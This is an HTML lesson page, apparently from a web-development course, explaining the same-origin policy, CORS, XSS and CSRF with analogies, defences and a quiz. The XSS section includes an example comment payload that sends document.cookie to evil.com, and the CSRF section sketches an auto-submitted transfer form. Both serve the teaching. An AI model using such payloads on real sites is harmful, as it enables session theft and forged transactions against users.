@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>14. Browser Security Model</title><link rel="stylesheet" href="style.css"></head>
+<body data-page="14"><main>
+<nav class="top"><a href="index.html">← All modules</a></nav>
+<h1>14. Browser Security Model: Same-Origin, CORS, XSS, CSRF</h1>
+<p class="lead">Your browser runs code from many sites at once. These rules keep them apart.</p>
+<section class="hf">
+<h2>🏢 Start here: the office building</h2>
+<div class="story"><b class="t">A story</b>
+Your browser is a big office building. Each <b>tab</b> is a different company on its own floor: your bank, a news site, a random site you opened by accident. All in the same building at the same time!<br><br>
+The building has one strict rule: <b>companies can't wander into each other's offices or read each other's files.</b> The bank's floor is locked to the news site's floor.<br><br>
+That rule is the <b>same-origin policy</b>. Everything else in this chapter (CORS, XSS, CSRF) is about <em>how the rule works, how it's selectively relaxed, and how attackers try to sneak around it</em>.</div>
+
+<h3>What counts as "the same office"? The origin</h3>
+<pre class="fig">   https://shop.com:443/cart
+   └─┬─┘   └──┬───┘ └┬┘
+  scheme    host   port      ← these three together = ORIGIN
+
+  https://shop.com/other      → SAME origin ✅
+  http://shop.com             → different (scheme)   ❌
+  https://api.shop.com        → different (host)     ❌
+  https://shop.com:8443       → different (port)     ❌</pre>
+
+<h3>CORS: a visitor pass signed by the host</h3>
+<p>Often your own front-end (<code>app.com</code>) legitimately needs data from your own API (<code>api.com</code>). Different origins, so the browser blocks reading the reply, <em>unless</em> the API says "app.com is welcome":</p>
+<pre class="fig">  Browser (page from app.com)                     api.com
+     │ ── GET /data  Origin: https://app.com ──►    │
+     │ ◄─ 200  Access-Control-Allow-Origin:         │
+     │          https://app.com                     │  "yes, app.com may read this"
+     │   browser sees the permission → lets JS read the reply ✅
+     │   (no header? browser BLOCKS the page from reading it: "CORS error" 🚫)</pre>
+<div class="brain"><b class="t">Brain power</b>"CORS error" in the console. Where do you fix it: in the front-end code or on the API server? <em>On the API server; it must send the right <code>Access-Control-Allow-Origin</code> header. Also note: CORS is enforced by the <b>browser</b>. curl ignores it, so CORS is not a replacement for authentication.</em></div>
+
+<h3>XSS: the graffiti artist who gets into your office</h3>
+<p><b>Cross-Site Scripting</b>: an attacker gets <em>their JavaScript to run on your page</em>. Imagine a comments section:</p>
+<pre><code>&lt;!-- attacker posts this "comment" --&gt;
+&lt;script&gt;fetch("https://evil.com/steal?c=" + document.cookie)&lt;/script&gt;
+
+// Vulnerable site code:
+commentDiv.innerHTML = comment;       // browser RUNS the script in the comment!
+
+// Safe site code:
+commentDiv.textContent = comment;     // shown as plain text, never executed</code></pre>
+<p>Every visitor viewing the comment now runs the attacker's code, with <em>your site's</em> powers: reading the page, calling APIs as the user. <b>Defences:</b> treat all user-provided text as <em>text</em> (<code>textContent</code>, template auto-escaping), set <code>HttpOnly</code> cookies, and add a <b>Content-Security-Policy</b> header.</p>
+
+<h3>CSRF: the forged signature</h3>
+<p><b>Cross-Site Request Forgery</b>: you're logged in to <code>bank.com</code>. You visit <code>evil.com</code>, which secretly makes your browser send:</p>
+<pre class="fig">  evil.com page contains:  &lt;form action="https://bank.com/transfer" method="POST"&gt; (auto-submitted)
+
+  Browser: "POST to bank.com? I have bank.com cookies. Attaching them!"
+  Bank:    "Valid session cookie → must be Ana asking. Transfer done." 😱</pre>
+<p>The attacker never saw your password or cookie; the browser attached it automatically. <b>Defences:</b></p>
+<ul>
+<li><code>SameSite=Lax</code> (or <code>Strict</code>) cookies: not sent on cross-site requests.</li>
+<li><b>CSRF tokens</b>: a secret value embedded in your real forms that <code>evil.com</code> can't know.</li>
+<li>Never change data with GET.</li>
+</ul>
+
+<h3>XSS vs CSRF in one picture</h3>
+<table>
+<tr><th></th><th>XSS</th><th>CSRF</th></tr>
+<tr><td>Attacker's code runs…</td><td>Inside <em>your</em> site</td><td>On the attacker's site</td></tr>
+<tr><td>Abuses…</td><td>The user's trust in your site</td><td>Your site's trust in the browser's cookies</td></tr>
+<tr><td>Main fix</td><td>Escape output, CSP</td><td>SameSite cookies, CSRF tokens</td></tr>
+</table>
+
+<h3>There are no Dumb Questions</h3>
+<details class="dumb"><summary>Q: Why does the browser block cross-origin reads at all?</summary><p>Otherwise any website you visit could use your logged-in session to read your email or bank pages and send the content to itself.</p></details>
+<details class="dumb"><summary>Q: Can I just set <code>Access-Control-Allow-Origin: *</code>?</summary><p>Fine for truly public data. For anything personal or cookie-based, allow only specific, known origins.</p></details>
+<details class="dumb"><summary>Q: Do frameworks protect me automatically?</summary><p>Many escape output and include CSRF protection by default. But you can switch the safety off by accident (e.g. <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>|safe</code>). Know what the default is.</p></details>
+
+<details class="pencil"><summary>✏️ Sharpen your pencil: which attack?</summary>
+<p>(1) A forum post containing a script that runs for every reader. (2) A hidden form on a cat-pictures site that changes your email at another site. (3) Your front-end gets blocked reading the API due to a missing header.<br><b>Answer:</b> (1) XSS, (2) CSRF, (3) CORS (not an attack; a browser rule you need to configure).</p></details>
+
+<div class="points"><b class="t">Key points</b><ul>
+<li>Origin = scheme + host + port. Same-origin policy keeps sites apart.</li>
+<li>CORS = the server opting in to cross-origin reads. Enforced by the browser only.</li>
+<li>XSS = attacker script on your page: escape output, use CSP, HttpOnly cookies.</li>
+<li>CSRF = forged requests using the victim's cookies: SameSite and CSRF tokens.</li>
+<li>Never trust the client; validate on the server.</li>
+</ul></div>
+</section>
+
+
+<h2>📋 Quick reference: the details</h2>
+<div class="box key"><b class="t">Key idea</b>An <b>origin</b> = scheme + host + port (<code>https://shop.com:443</code>). The <b>same-origin policy</b> stops a page from one origin reading data from another, so evil.com can't read your bank page.</div>
+
+<h3>Same-origin policy and CORS</h3>
+<table>
+<tr><th>Page at https://app.com</th><th>Same origin?</th></tr>
+<tr><td>https://app.com/other</td><td>Yes</td></tr>
+<tr><td>http://app.com</td><td>No (scheme)</td></tr>
+<tr><td>https://api.app.com</td><td>No (host)</td></tr>
+<tr><td>https://app.com:8443</td><td>No (port)</td></tr>
+</table>
+<p><b>CORS</b> (Cross-Origin Resource Sharing) is how a server <em>opts in</em> to being read by another origin:</p>
+<pre><code>Access-Control-Allow-Origin: https://app.com
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Headers: Content-Type, Authorization</code></pre>
+<ul>
+<li>The <b>browser</b> enforces CORS, not the server. curl ignores it. A CORS error means the API server didn't allow your page's origin.</li>
+<li>For non-simple requests the browser first sends an <b>OPTIONS preflight</b>.</li>
+<li><code>Allow-Origin: *</code> is fine for public data, dangerous with credentials; never reflect arbitrary origins.</li>
+</ul>
+
+<h3>XSS: Cross-Site Scripting</h3>
+<p>An attacker gets their <b>JavaScript to run inside your site</b> (e.g. a comment containing <code>&lt;script&gt;</code>). It then runs with the victim's session: read page data, act as the user.</p>
+<pre><code>// Vulnerable: inserting user text as HTML
+el.innerHTML = comment;
+// Safe: insert as text
+el.textContent = comment;</code></pre>
+<p>Defences: <b>escape/encode output</b> for its context, prefer <code>textContent</code> and frameworks that escape by default, <b>Content-Security-Policy</b> header, <code>HttpOnly</code> cookies (module 5).</p>
+
+<h3>CSRF: Cross-Site Request Forgery</h3>
+<p>Browsers attach cookies automatically. A malicious page can make your browser send <code>POST bank.com/transfer</code>, and your session cookie goes along, so the server thinks <em>you</em> asked.</p>
+<p>Defences: <code>SameSite=Lax/Strict</code> cookies, <b>anti-CSRF tokens</b> in forms, checking <code>Origin</code> header, never changing state with GET.</p>
+
+<h3>Other notes</h3>
+<ul>
+<li><b>Clickjacking</b>: hidden iframe tricks clicks; defend with <code>X-Frame-Options</code> / CSP <code>frame-ancestors</code>.</li>
+<li>Mixed content (HTTP resources on an HTTPS page) is blocked.</li>
+<li><b>Never trust the client</b>; XSS and CSRF both exploit trusting what the browser sends or runs.</li>
+</ul>
+
+<h2>Check your understanding</h2><div id="quiz"></div>
+<h2>Think it through</h2><div id="think"></div>
+<div class="pager"><a href="13-rest-api.html">← REST</a><a href="15-transport.html">Next: Transport & Protocols →</a></div>
+</main>
+<script>
+window.QUIZ=[
+{q:"An origin consists of:",options:["Domain only","Scheme + host + port","IP + MAC","Path + query"],answer:1,why:"Any difference makes it a different origin."},
+{q:"Is https://app.com a same-origin as https://api.app.com?",options:["Yes","No, the host differs","Yes, same domain","Depends on cookies"],answer:1,why:"Subdomains are different origins."},
+{q:"Who enforces CORS?",options:["The API server blocks requests","The browser, based on the server's headers","The DNS","The router"],answer:1,why:"The server sends permission headers; the browser decides whether JS may read the response. curl doesn't care."},
+{q:"An attacker's script runs in your page because you rendered a comment with innerHTML. This is:",options:["CSRF","XSS","DDoS","DNS spoofing"],answer:1,why:"Injected script executing in your origin."},
+{q:"Best defence against XSS when showing user text?",options:["Hide the page","Escape output / use textContent","Use GET","Use longer URLs"],answer:1,why:"Treat user data as text, not markup."},
+{q:"CSRF works because:",options:["Browsers automatically attach cookies to requests to the site","Passwords are weak","JS is slow","TLS is broken"],answer:0,why:"The forged request carries the victim's cookies."},
+{q:"Which helps stop CSRF?",options:["SameSite cookies and anti-CSRF tokens","Larger fonts","Minifying JS","Caching"],answer:0,why:"They ensure the request really came from your own site."},
+{q:"Your frontend gets a CORS error calling your API. Where is the fix?",options:["Frontend code only","Server must send proper Access-Control-Allow-Origin","DNS","Disable HTTPS"],answer:1,why:"The API must opt in to the frontend's origin."}
+];
+window.THINK=[
+{q:"Why doesn't CORS protect your API from a malicious script running on a server or via curl?",a:"CORS only restricts what <em>browsers</em> let page JS read. Other clients ignore it, so the API still needs authentication and authorization."},
+{q:"Compare XSS and CSRF in one sentence each.",a:"XSS: attacker code runs in the victim's browser inside your site. CSRF: attacker makes the victim's browser send an unwanted request to your site using their credentials."}
+];
+</script><script src="quiz.js"></script></body></html>
